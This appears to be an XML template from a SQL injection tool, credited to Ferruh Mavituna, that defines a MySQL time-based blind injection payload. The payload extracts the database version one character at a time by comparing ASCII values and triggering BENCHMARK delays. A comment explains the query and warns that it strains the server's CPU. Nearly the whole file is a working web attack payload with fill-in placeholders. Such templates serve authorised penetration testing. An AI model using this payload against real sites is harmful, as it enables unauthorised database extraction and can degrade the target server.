  <bsql>
    <author>
      Ferruh Mavituna - http://ferruh.mavituna.com
    </author>
    <name>Template - MySQL - Full Blind SQL Injection</name>

    <query><![CDATA[?id=1 AND 1=(SELECT IF((IFNULL(ASCII(SUBSTRING((SELECT @@version),{POSITION},1)),0){OPERATION}{CHAR}),BENCHMARK(900000,SHA1(1)),1))/*
]]></query>

<!--
	It's highly recommended that you run this in 1 thread or 2. Since we are using BENCHMARK() we actually put a lot of pressure on the webserver's CPU. More than one thread will make it really unstable and strictly DO NOT USE in production / critical systems.

	SELECT IF(
		(
			IFNULL(
				ASCII(SUBSTRING((SELECT @@version),{POSITION},1))
			,0)
			{OPERATION}{CHAR}
		),BENCHMARK(900000,SHA1(1))
	,1)

-->

	<detectiontype><![CDATA[BlindSQL]]></detectiontype>
</bsql>
